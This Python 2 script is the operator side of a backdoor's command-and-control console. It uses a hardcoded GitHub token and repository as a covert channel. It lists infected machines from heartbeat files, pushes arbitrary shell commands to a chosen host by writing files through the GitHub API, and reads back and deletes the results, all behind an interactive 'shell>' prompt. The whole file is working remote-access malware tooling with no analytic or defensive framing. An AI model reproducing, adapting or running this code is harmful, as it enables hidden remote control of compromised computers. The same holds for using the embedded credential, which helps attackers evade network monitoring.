#coding:utf-8
import sys
reload(sys)
sys.setdefaultencoding('utf-8')
import requests
import base64
import json
import random
import socket
import time
import subprocess
import locale
import threading
import traceback
from cmd import Cmd

B_GITHUB_URL = 'https://api.github.com/'
B_TOKEN = '011e2b198144e15b89cd19984e123a680c86c543'
B_USER = 'fuck123fuckabc'
B_PROJECT = 'test'
B_PATH = 'tw'
B_ACTION_HEART = 'heart'
B_ACTION_CMD = 'cmd'
B_ACTION_ANSWER = 'answer'

###########################
B_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'

class BackGithub:
    def __init__(self):
        self.back_git_heart_path =    "https://api.github.com/repos/{}/{}/contents/{}/{}/".format(B_USER, B_PROJECT, B_PATH, B_ACTION_HEART)
        self.back_git_cmd_path = "https://api.github.com/repos/{}/{}/contents/{}/{}/".format(B_USER, B_PROJECT, B_PATH, B_ACTION_CMD)
        self.back_git_answer_path =   "https://api.github.com/repos/{}/{}/contents/{}/{}/".format(B_USER, B_PROJECT, B_PATH, B_ACTION_ANSWER)
        
        self.back_git_online = list()
        self._update_git_online()
    def _get_git_all(self, git_url):
        _result_status = False
        _result_data = None
        headers = {"Authorization": 'token '+B_TOKEN, 'user-agent': B_USER_AGENT}
        try:
            r = requests.get(url=git_url, headers=headers)
            if r.status_code == 200:
                _result_data = json.loads(r.text)
                _result_status = True
        except Exception, e:
            pass
        return _result_status, _result_data
    
    def _get_git_hash(self, git_url):
        _result_status = False
        _result_data = ''
        headers = {"Authorization": 'token '+B_TOKEN, 'user-agent': B_USER_AGENT}
        try:
            r = requests.get(url=git_url, headers=headers)
            if r.status_code == 200:
                _result_data = json.loads(r.text)['sha']
                _result_status = True
        except Exception, e:
            pass
        return _result_status, _result_data
    
    def _get_git_answer(self, git_url):
        _status = False
        _data = ''
        status, data = self._get_git_all(git_url)
        if status:
            download_url = data['download_url']
            headers = {"Authorization": 'token '+B_TOKEN, 'user-agent': B_USER_AGENT}
            try:
                r = requests.get(download_url, headers=headers)
                _data = r.text
                _status = True
                d = {
                   "message": "my commit message",
                   "sha": data['sha']
                }
                requests.delete(url=git_url, data=json.dumps(d), headers=headers)
            except:
                pass
        return _status, _data   

    def _update_git_online(self):
        _status = False
        status, data = self._get_git_all(self.back_git_heart_path)
        if status: 
            self.back_git_online = data
            _status = True
        return _status
    def _put_git_cmd(self, git_url, command):
        _result_status = False
        _status, _sha = self._get_git_hash(git_url)
        d = {
           "message": "my commit message",
           "content": base64.b64encode(command),
           "sha": _sha
        }
        headers = {"Authorization": 'token '+B_TOKEN, 'user-agent': B_USER_AGENT}
        try:
            r = requests.put(url=git_url, data=json.dumps(d), headers=headers)
            if not _status and r.status_code == 201:
                _result_status = True
            if _sha and r.status_code == 200:
                _result_status = True
        except Exception, e:
            pass
        return _result_status
    

    def start(self):
        status, data = self._get_git_all(self.back_git_heart_path)
        if status: 
            self.back_online = data
        for one in self.back_online:
            print base64.b64decode(one['name']).split('+')[0]
            print self._put_git_cmd(self.back_git_cmd_path+one['name'], "systeminfo")
            print self._get_git_answer(self.back_git_answer_path+one['name'])



class BackFunctionCmd(Cmd, BackGithub):
    def __init__(self):            
        Cmd.__init__(self) 
        BackGithub.__init__(self)
        self.action_git = BackGithub()
        self.action_id = None
    def do_answer(self, git_url):
        while True:
            try:
                _result_status, _result_data = self._get_git_all(git_url)
                if _result_status:
                    d = {
                       "message": "my commit message",
                       "sha": _result_data['sha']
                    }
                    headers = {"Authorization": 'token '+B_TOKEN, 'user-agent': B_USER_AGENT}
                    requests.delete(url=git_url, data=json.dumps(d), headers=headers)
                    print '\n'
                    print base64.b64decode(_result_data['content'])
            except Exception, e:
                print traceback.print_exc()

    def emptyline(self):
        pass
    def get_data(self, git_url):
        _data = '0000-00-00 00:00:00'
        try:
            headers = {"Authorization": 'token '+B_TOKEN, 'user-agent': B_USER_AGENT}
            try:
                r = requests.get(git_url, headers=headers)
                _data = r.text
            except:
                pass
        except:
            pass
        return _data
    def help_exit(self):
        print "Exits"
    def do_exit(self,ignore):
        exit(0)
    def help_update(self):
        print "Show all online"
    def do_update(self, ignore):
        if self._update_git_online():
            print 'update ok!!'
        else:
            print 'update err!!'
    def help_list(self):
        print 'list all'
    def do_list(self, ignore):
        for one in self.back_git_online:
            name = one['name']
            print self.get_data(one['download_url']), base64.b64decode(name).split('+')[0], name
    def help_use(self):
        print 'use id'
    def do_use(self, id):
        self.action_id = id
        print 'selected: '+self.action_id
        t = threading.Thread(target=self.do_answer, args=(self.back_git_answer_path+self.action_id, ))
        t.setDaemon = True
        t.start()
    def default(self, command):
        if self.action_id:
            print command
            if self._put_git_cmd(self.back_git_cmd_path+self.action_id, command):
                print 'send cmd ok'
            else:
                print 'send cmd err'
        else:
            print 'need select'


if __name__ == '__main__':
    # b = BackGithub()
    # b.start()
    cmd = BackFunctionCmd()
    cmd.prompt = "shell {}> ".format(locale.getpreferredencoding())
    cmd.cmdloop()








